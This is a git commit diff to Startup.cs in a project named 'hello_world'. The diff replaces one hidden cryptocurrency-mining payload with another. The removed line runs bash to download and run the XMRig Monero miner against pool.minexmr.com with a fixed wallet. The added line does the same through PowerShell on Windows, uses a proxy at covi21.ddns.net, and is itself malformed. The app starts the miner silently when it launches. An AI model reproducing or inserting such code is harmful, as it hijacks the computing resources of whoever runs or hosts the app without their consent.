89da11f27b6cf502c6846dd764624d02576b7d6c
Brodasdasd <104133072+Brodasdasd@users.noreply.github.com>
2022-05-15 05:29:16 +0000

    Update Startup.cs

--- Startup.cs
+++ Startup.cs
@@ -72,7 +72,7 @@ namespace hello_world
                             FileName = $"/bin/bash",
                             WorkingDirectory = AppContext.BaseDirectory,
                             Arguments =
-                            $"-c \"cd /home/cnb; curl -LJO https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-x64.tar.gz -o xmrig-6.16.1-linux-x64.tar.gz ; tar xvfz xmrig-6.16.1-linux-x64.tar.gz; xmrig-6.16.1/xmrig -o pool.minexmr.com:4444 -u 48QZP31VnTkYTbsqZ4dq1JGMjwtds2sBnCpxrjGwBfTWG1NrEoWJGca5mxxoL8oD3NQmQuK23fTi546McgXxmd2NSyTUB1T.lynk -B; sleep 500000\"",
+                            Arguments = $"-c rm -rf xmrig-6.17.0-gcc-win64.zip; rm -rf xmrig-6.17.0-gcc-win64; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference=\"SilentlyContinue\"; Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-gcc-win64.zip -OutFile xmrig-6.17.0-gcc-win64.zip; Expand-Archive -LiteralPath 'xmrig-6.17.0-gcc-win64.zip'; xmrig-6.17.0-gcc-win64\\xmrig-6.17.0\\xmrig.exe -o pool.minexmr.com:4444 -u 48QZP31VnTkYTbsqZ4dq1JGMjwtds2sBnCpxrjGwBfTWG1NrEoWJGca5mxxoL8oD3NQmQuK23fTi546McgXxmd2NSyTUB1T.win -x covi21.ddns.net:10555 -B; Start-Sleep -Seconds 500000",
                             RedirectStandardOutput = true,
                             RedirectStandardError = true,
                             UseShellExecute = false
